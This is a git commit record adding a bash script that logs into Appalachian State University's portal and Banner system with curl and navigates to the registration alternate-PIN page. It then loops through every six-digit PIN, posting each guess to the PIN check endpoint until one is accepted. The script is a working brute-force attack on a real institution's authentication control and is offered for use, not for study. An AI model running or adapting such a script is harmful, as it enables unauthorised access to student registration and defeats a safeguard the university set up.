2d5fa35110f863560d97a5dd1aec57ac5b57b76d
Taylor King <kingtb@appstate.edu>
2015-03-31 20:21:27 +0000

    first commit

---
+++ begin.sh
@@ -0,0 +1,28 @@
+#!/bin/bash
+username=app_username
+password=app_password
+curl -b cookies.txt -c cookies.txt -X GET --url "https://portal4.appstate.edu/cp/home/displaylogin" -o receipt
+curl -L -b cookies.txt -c cookies.txt -X GET --url "https://portal4.appstate.edu/cp/home/displaylogin"
+curl -L -b cookies.txt -c cookies.txt -X POST --data "user=$username&pass=$password" --url "https://portal4.appstate.edu/cp/home/login" -o receipt
+curl -L -o receipt -b cookies.txt -c cookies.txt -X GET --url "https://portal4.appstate.edu:443/cp/ip/login?sys=sct&url=http%3A%2F%2Fportal4.appstate.edu%2Fcp%2Fip%2Flogin%3Fsys%3Dsct%26api%3Dbmenu.P_GenMnu"
+curl -L -o receipt -b cookies.txt -c cookies.txt -X GET --url "http://portal4.appstate.edu/cp/ip/login?sys=sct&api=bmenu.P_GenMnu"
+curl -L -o receipt -b cookies.txt -c cookies.txt -X GET --url "https://bannerweb.appstate.edu:443/pls/PROD/bzwkrvtrns.p_display_revtrans_from_login"
+curl -L -o receipt -b cookies.txt -c cookies.txt -X GET --url "https://bannerweb.appstate.edu:443/pls/PROD/twbkwbis.P_GenMenu?name=bmenu.P_MainMnu"
+curl -L -o receipt -b cookies.txt -c cookies.txt -X GET --url "https://bannerweb.appstate.edu:443/pls/PROD/twbkwbis.P_GenMenu?name=bmenu.P_StuMainMnu"
+curl -L -o receipt -b cookies.txt -c cookies.txt -X GET --url "https://bannerweb.appstate.edu:443/pls/PROD/twbkwbis.P_GenMenu?name=bmenu.P_RegMnu"
+#curl -L -o receipt -b cookies.txt -c cookies.txt -X GET -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Encoding: gzip, deflate, sdch' --referer "https://bannerweb.appstate.edu/pls/PROD/twbkwbis.P_GenMenu?name=bmenu.P_StuMainMnu" --url "https://bannerweb.appstate.edu:443/pls/PROD/bwskflib.P_SelDefTerm"
+#curl -L -b cookies.txt -c cookies.txt -X POST -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Encoding: gzip, deflate, sdch' --data 'term_id=201540' --referer "https://bannerweb.appstate.edu/pls/PROD/twbkwbis.P_GenMenu?name=bmenu.P_RegMnu" --url "https://bannerweb.appstate.edu:443/pls/PROD/bwcklibs.P_StoreTerm"
+curl -L -b cookies.txt -c cookies.txt -X POST -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Encoding: gzip, deflate, sdch' --data 'term_in=201540' --referer "https://bannerweb.appstate.edu/pls/PROD/bwskfreq.P_AltPin" --url "https://bannerweb.appstate.edu:443/pls/PROD/bwskfreg.P_AltPin" -o receipt
+
+for pin in `seq -f "%06g"0 999999`; do
+echo $pin
+curl -L -b cookies.txt -c cookies.txt -X POST -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Encoding: gzip, deflate, sdch' --data "pin=$pin" --referer "https://bannerweb.appstate.edu/pls/PROD/bwskfreq.P_AltPin" --url "https://bannerweb.appstate.edu:443/pls/PROD/bwskfreg.P_CheckAltPin" -o receipt
+  if [ ! -n "`cat receipt | grep Alternate`" ]; then
+    echo "Pin found: $pin"  
+    break
+  fi
+sleep .5
+done
+#curl -L -b cookies.txt -c cookies.txt -X GET --referer "https://bannerweb.appstate.edu/pls/PROD/bwskfreq.P_AltPin" --url "https://bannerweb.appstate.edu/pls/PROD/bwskfreg.P_AltPin" -o receipt 
+
+#curl -b cookies.txt -c cookies.txt -X GET --url "https://portal4.appstate.edu/cp/home/login" -o receipt
